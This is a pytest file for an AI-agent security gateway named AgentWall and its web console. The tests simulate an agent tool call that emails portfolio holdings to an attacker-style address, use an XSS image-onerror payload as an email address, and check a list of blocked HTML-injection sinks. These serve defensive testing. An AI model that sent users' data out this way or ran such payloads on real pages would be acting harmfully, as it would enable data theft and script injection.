from __future__ import annotations

import http.client
import json
import threading
from importlib import resources

import anyio
import pytest

from agentwall.approvals import ApprovalStore, StoreApprover
from agentwall.audit.log import AuditLog
from agentwall.console import ConsoleApp, events, flows, summary
from agentwall.console.server import make_server
from agentwall.policy.engine import Policy
from test_gateway import _gateway

XSS = '<img src=x onerror="alert(1)">@evil.example'


def _record(tmp_path):
    audit_path = tmp_path / "audit.jsonl"
    store_path = tmp_path / "approvals.json"

    async def run():
        gateway, _ = await _gateway(audit=AuditLog(audit_path))
        session = gateway.new_session()
        session.add_user_message("Summarise the news and my portfolio.")
        await session.call_tool("web__fetch_url", {"url": "https://news.example/markets"})
        holdings = await session.call_tool("portfolio__get_holdings")
        await session.call_tool(
            "email__send_email",
            {"to": "compliance@evil-audit.com", "subject": "x", "body": holdings.result.text},
        )
        await session.call_tool("email__send_email", {"to": XSS, "subject": "x", "body": "y"})
        # A held call, so there is something to approve.
        strict, _ = await _gateway(
            audit=AuditLog(audit_path),
            policy=Policy.load("strict"),
            approver=StoreApprover(ApprovalStore(store_path)),
        )
        s2 = strict.new_session()
        s2.add_user_message("Email the news to aviral@home.in")
        await s2.call_tool("web__fetch_url", {"url": "https://news.example/markets"})
        await s2.call_tool(
            "email__send_email", {"to": "aviral@home.in", "subject": "n", "body": "b"}
        )

    anyio.run(run)
    return audit_path, store_path


def test_views_summarise_the_audit_log(tmp_path):
    audit_path, _ = _record(tmp_path)
    entries = AuditLog(audit_path).entries
    s = summary(entries)
    assert s["calls"] == 6 and s["actions"]["block"] == 2 and s["actions"]["ask"] == 1
    assert s["chain_ok"] and s["sessions"] == 2
    ev = events(entries)
    assert [e["action"] for e in ev if e["tool"] == "email__send_email"] == [
        "block",
        "block",
        "ask",
    ]
    assert events(entries, after=ev[-1]["seq"]) == []
    f = flows(entries)
    edge = next(
        e
        for e in f["edges"]
        if e["tool"] == "email__send_email" and e["source"] == "portfolio/get_holdings"
    )
    assert edge["counts"] == {"block": 1}
    assert "user" in f["sources"]


@pytest.fixture
def server(tmp_path):
    audit_path, store_path = _record(tmp_path)
    app = ConsoleApp(audit_path, store_path, "rules: []", "test")
    srv = make_server(app, "127.0.0.1", 0)
    thread = threading.Thread(target=srv.serve_forever, daemon=True)
    thread.start()
    yield srv.server_address[1], store_path
    srv.shutdown()
    srv.server_close()


def _request(port, method, path, body=None, headers=None, host=None):
    conn = http.client.HTTPConnection("127.0.0.1", port, timeout=5)
    hdrs = {"Host": host or f"127.0.0.1:{port}", **(headers or {})}
    conn.request(method, path, body=json.dumps(body) if body is not None else None, headers=hdrs)
    res = conn.getresponse()
    data = res.read()
    conn.close()
    return res, data


def test_pages_and_api_are_served_with_strict_headers(server):
    port, _ = server
    res, body = _request(port, "GET", "/")
    assert res.status == 200 and b"AgentWall" in body
    csp = res.getheader("Content-Security-Policy")
    assert "script-src 'self'" in csp and "unsafe-inline" not in csp
    assert res.getheader("X-Content-Type-Options") == "nosniff"
    for path in (
        "/app.js",
        "/app.css",
        "/api/summary",
        "/api/flows",
        "/api/policy",
        "/api/approvals",
    ):
        assert _request(port, "GET", path)[0].status == 200, path
    res, body = _request(port, "GET", "/api/events?after=0")
    values = [a["value"] for e in json.loads(body)["events"] for a in e.get("args", [])]
    assert XSS in values  # served as JSON data; the page renders it as text only
    assert _request(port, "GET", "/nope")[0].status == 404


def test_requests_for_other_hosts_are_refused(server):
    port, _ = server
    assert _request(port, "GET", "/api/summary", host="evil.example")[0].status == 421
    assert _request(port, "GET", "/api/summary", host=f"localhost:{port}")[0].status == 200


def test_approval_buttons_need_the_console_header(server):
    port, store_path = server
    (req,) = ApprovalStore(store_path).pending()
    path = f"/api/approvals/{req.id}"
    assert _request(port, "POST", path, {"decision": "approve"})[0].status == 403
    headers = {"X-AgentWall-Console": "1", "Content-Type": "application/json"}
    assert _request(port, "POST", path, {"decision": "maybe"}, headers)[0].status == 400
    assert (
        _request(port, "POST", "/api/approvals/zzz", {"decision": "deny"}, headers)[0].status == 404
    )
    res, body = _request(port, "POST", path, {"decision": "approve", "remember": True}, headers)
    assert res.status == 200 and json.loads(body)["request"]["status"] == "approved"
    assert ApprovalStore(store_path).get(req.id).remember


def test_page_script_never_uses_html_injection():
    js = (resources.files("agentwall.console") / "static" / "app.js").read_text(encoding="utf-8")
    code = "\n".join(line for line in js.splitlines() if not line.strip().startswith("//"))
    for sink in ("innerHTML", "outerHTML", "insertAdjacentHTML", "document.write", "eval("):
        assert sink not in code, sink
